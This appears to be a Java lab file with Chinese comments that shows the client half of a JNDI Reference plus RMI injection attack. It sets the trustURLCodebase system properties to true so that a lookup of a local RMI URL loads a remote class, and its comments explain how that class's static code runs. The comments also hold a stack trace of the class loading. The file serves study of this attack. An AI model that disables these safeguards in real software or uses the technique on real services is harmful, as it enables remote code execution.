package org.example;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.RemoteException;

/*
 * JNDI Reference Payload + RMI 攻击
 * test.class 静态代码块中包含恶意代码，调用initialContext.lookup()方法会执行Reference中定义的类的加载
 *
 * NamingManager.java 中getObjectFactoryFromReference方法定义了加载逻辑，如果当前类路径中不存在，则从codebase
 * 中加载
 *
 * 核心是Reference类
 *
 * 堆栈如下
 * java.lang.Exception
	at java.lang.ClassLoader.defineClass(ClassLoader.java:756)
	at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142)
	at java.net.URLClassLoader.defineClass(URLClassLoader.java:468)
	at java.net.URLClassLoader.access$100(URLClassLoader.java:74)
	at java.net.URLClassLoader$1.run(URLClassLoader.java:369)
	at java.net.URLClassLoader$1.run(URLClassLoader.java:363)
	at java.security.AccessController.doPrivileged(Native Method)
	at java.net.URLClassLoader.findClass(URLClassLoader.java:362)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:418)
	at java.net.FactoryURLClassLoader.loadClass(URLClassLoader.java:817)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:351)
	at java.lang.Class.forName0(Native Method)
	at java.lang.Class.forName(Class.java:348)
	at com.sun.naming.internal.VersionHelper12.loadClass(VersionHelper12.java:91)
	at com.sun.naming.internal.VersionHelper12.loadClass(VersionHelper12.java:101)
	at com.sun.naming.internal.VersionHelper12.loadClass(VersionHelper12.java:115)
	at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:163)
	at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:329)
	at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:499)
	at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
	at javax.naming.InitialContext.lookup(InitialContext.java:417)
	at org.example.Client2.main(Client2.java:20)
 */
public class Client2 {
    public static void main(String[] args) throws NamingException, RemoteException {
        String url = "rmi://localhost:8971/obj";
        //新版jdk8u以上 不加这句话报错 The object factory is untrusted.
        //Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        InitialContext initialContext = new InitialContext();
        Reference lookup = (Reference) initialContext.lookup(url);


    }
}
